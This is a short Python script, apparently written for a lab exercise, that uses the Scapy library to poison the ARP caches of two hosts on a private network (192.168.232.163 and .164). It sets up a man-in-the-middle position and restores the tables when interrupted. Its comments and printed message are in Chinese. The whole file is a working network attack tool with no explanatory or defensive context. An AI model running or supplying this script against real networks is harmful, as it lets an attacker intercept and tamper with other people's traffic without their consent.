from scapy.all import *
from scapy.layers.l2 import ARP
from scapy.all import getmacbyip

def arp_poison(target_ip, host_ip):
    target_mac = getmacbyip(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=False)

def mitm_attack(target_a, target_b):
    try:
        while True:
            arp_poison(target_a, target_b)
            arp_poison(target_b, target_a)
            time.sleep(2)
    except KeyboardInterrupt:
        print("攻击结束")
        restore(target_a, target_b)
        restore(target_b, target_a)

def restore(dest_ip, source_ip):
    dest_mac = getmacbyip(dest_ip)
    source_mac = getmacbyip(source_ip)
    arp_response = ARP(pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(arp_response, verbose=False, count=4)

if __name__ == "__main__":
    target_a = "192.168.232.163"  # A的IP地址
    target_b = "192.168.232.164"  # B的IP地址
    mitm_attack(target_a, target_b)